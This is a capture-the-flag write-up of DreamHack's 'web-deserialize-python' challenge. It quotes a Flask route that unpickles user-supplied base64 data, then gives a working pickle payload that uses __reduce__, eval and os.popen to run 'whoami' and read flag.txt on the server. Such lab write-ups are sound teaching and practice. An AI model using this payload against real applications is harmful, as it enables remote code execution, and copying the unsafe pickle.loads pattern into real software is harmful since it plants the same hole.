# web-deserialize-python — DreamHack

> **Room / Challenge:** web-deserialize-python (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** web-deserialize-python (web)
- **Link**: `https://dreamhack.io/wargame/challenges/40`
- **Level:** `2`
- **Date:** `13-11-2025`

---

## Goal

Leveraging insecure deserialization to retrieve the flag.

## My Solution

The vulnerability is in the `/check-session` route:

```python
@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)
```

The server will loads whatever we pass to the `session` data:

```python
info = pickle.loads(base64.b64decode(session))
```

The vulnerability here is the `pickle`. Therefore, we can create a malicious payload through Python:

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        p="os.popen('whoami').read()"
        return (eval,(p,))

obj = {'name':Exploit()}

print(base64.b64encode(pickle.dumps(obj)).decode('utf8'))
```

Submitting the payload in `/check_session`, the result:
![Guide image](./screenshots/1.png)

Now change the exploit command:

```python
p="os.popen('cat ./flag.txt').read()"
```

![Guide image](./screenshots/2.png)
